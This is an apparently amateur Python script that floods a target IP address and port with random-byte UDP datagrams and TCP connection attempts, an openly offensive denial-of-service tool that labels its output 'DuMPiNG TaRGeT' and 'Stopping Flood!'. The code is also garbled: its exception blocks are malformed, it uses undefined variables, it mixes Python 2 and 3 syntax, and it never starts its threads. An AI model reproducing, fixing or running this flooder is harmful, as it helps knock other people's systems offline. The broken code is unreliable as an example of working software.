#!/usr/bin/env python
import os
import sys
import time
import random
import threading
import socket

if len(sys.argv) < 4:
    sys.exit("Usage: python "+sys.argv[0]+" <ip> <port> <size>")

ip = sys.argv[1]
port = int(sys.argv[2])
size = int(sys.argv[3])
packets = int(sys.argv[3])
sent = 0

class syn(threading.Thread):
    def __init__(self, ip, port, packets):
        self.ip = ip
        self.port = port
        self.packets = packets
        self.syn = socket.socket()
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                self.syn.connect((self.ip, self.port))
            except:
                pass
                
                udp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                syn = socket.socket()
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
                if port == "0":
                        port = random.randrange(1, 65535)
                s.connect((ip, port))
                s.send(data)
                bytes = random._urandom(size)
                syn.connect((ip, port))
                udp.sendto(bytes,(ip, port))
                sent = sent + 1
                print("DuMPiNG TaRGeT: %s | PoRT: %s | SiZe: %s | TiMe: %s | PaCKeT: %s")%(ip, port, size, t1m3, sent))
				#sys.stdout.write("\x1b]2;Total Packets Sent: %s\x07" % sent)
        except (KeyboardInterrupt):
                print("Stopping Flood!")
                sys.exit()
        except socket.error, msg:
                print("Socket Couldn't Connect")
                sys.exit()
